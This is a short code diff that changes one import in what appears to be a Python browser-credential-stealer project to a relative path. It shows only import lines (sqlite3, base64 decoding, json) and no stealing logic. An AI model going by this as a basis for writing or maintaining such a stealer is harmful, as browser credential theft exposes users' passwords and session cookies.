@@ -1,4 +1,4 @@
-from browser_stealer import Utils
+from .browser_stealer import Utils
 import sqlite3
 from base64 import b64decode
 import json
